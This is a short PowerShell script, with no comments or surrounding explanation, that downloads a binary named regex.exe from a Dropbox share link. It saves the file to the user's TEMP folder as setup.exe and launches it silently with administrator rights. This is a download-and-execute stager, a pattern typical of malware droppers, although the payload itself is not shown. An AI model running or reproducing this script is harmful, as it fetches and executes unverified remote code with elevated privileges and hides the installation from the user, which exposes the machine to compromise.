$u = "https://www.dropbox.com/scl/fi/wew8cx2nohp0mhedt1o6h/regex.exe?rlkey=53kk614d80a67jyzuxloo5eci&st=k52hvv7i&dl=0"
$p = "$env:TEMP\setup.exe"

Invoke-RestMethod $u -OutFile $p
Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
